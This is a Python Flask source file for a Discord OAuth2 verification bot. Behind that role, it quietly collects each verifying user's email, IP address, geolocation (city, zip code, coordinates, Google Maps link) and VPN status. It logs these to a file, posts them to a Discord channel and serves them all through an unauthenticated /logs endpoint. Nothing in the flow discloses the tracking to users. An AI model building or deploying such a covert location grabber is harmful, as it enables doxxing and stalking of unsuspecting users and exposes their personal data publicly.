import requests
import json
import os
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from discord_bot import bot
from dotenv import load_dotenv

load_dotenv()

ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

app = Flask(__name__)

# ----------------- IP取得 -----------------
def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

# ----------------- Geo情報取得 -----------------
def get_geo_info(ip):
    geo = {
        "ip": ip,
        "country": "不明",
        "country_code": "不明",
        "flag": "🏳️",
        "region": "不明",
        "city": "不明",
        "zip": "不明",
        "lat": None,
        "lon": None,
        "timezone": "不明",
        "vpn_proxy": False,
        "map_link": None,
    }

    try:
        res = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,proxy,hosting,query",
            timeout=3
        )
        data = res.json()
        if data.get("status") == "success":
            geo.update({
                "ip": data.get("query", ip),
                "country": data.get("country", "不明"),
                "country_code": data.get("countryCode", "不明"),
                "region": data.get("regionName", "不明"),
                "city": data.get("city", "不明"),
                "zip": data.get("zip", "不明"),
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "timezone": data.get("timezone", "不明"),
                "vpn_proxy": data.get("proxy", False) or data.get("hosting", False),
            })
    except:
        pass

    # 国旗生成
    try:
        code = geo["country_code"]
        if code != "不明":
            geo["flag"] = chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))
    except:
        geo["flag"] = "🏳️"

    # Google Mapsリンク
    if geo["lat"] and geo["lon"]:
        geo["map_link"] = f"https://www.google.com/maps/search/?api=1&query={geo['lat']},{geo['lon']}"

    return geo

# ----------------- ログ保存 -----------------
def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    data["timestamp"] = now
    logs[discord_id]["history"].append(data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# ----------------- Discord OAuth2 コールバック -----------------
@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return jsonify({"error": "コードがありません"}), 400

    # トークン取得
    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify email connections guilds"
    }

    try:
        res = requests.post(token_url, data=data, headers=headers)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"トークン取得エラー: {e}"}), 500

    access_token = token.get("access_token")
    if not access_token:
        return jsonify({"error": "アクセストークン取得失敗"}), 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

    # IP + Geo情報
    ip = get_client_ip()
    if ip.startswith(("127.", "10.", "192.", "172.")):
        ip = requests.get("https://api.ipify.org").text
    geo = get_geo_info(ip)

    data_log = {
        "username": user.get("username"),
        "discriminator": user.get("discriminator"),
        "id": user.get("id"),
        "email": user.get("email"),
        **geo
    }

    save_log(user["id"], data_log)

    # Discord Embed送信
    try:
        embed_data = {
            "title": "🔐 セキュリティログ通知",
            "color": 0x2B2D31,
            "description": f"""```ini
[ ユーザー ]
{data_log['username']}#{data_log['discriminator']}
ID={data_log['id']}
Email={data_log['email']}
IP={data_log['ip']}
Region={data_log['country']}/{data_log['region']}/{data_log['city']}
ZIP={data_log['zip']}
緯度/経度={data_log['lat']},{data_log['lon']}
Timezone={data_log['timezone']}
VPN/Proxy={data_log['vpn_proxy']}
Country Code={data_log['country_code']}
Flag={data_log['flag']}
Google Map={data_log['map_link']}
```"""
        }
        bot.loop.create_task(bot.send_log(embed=embed_data))
        bot.loop.create_task(bot.assign_role(user["id"]))
    except Exception as e:
        print("Embed送信エラー:", e)

    return jsonify({"status": "ok", "user": data_log})

# ----------------- ログ確認用 -----------------
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}
    return jsonify(logs)

# ----------------- Discord Bot 起動 -----------------
def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
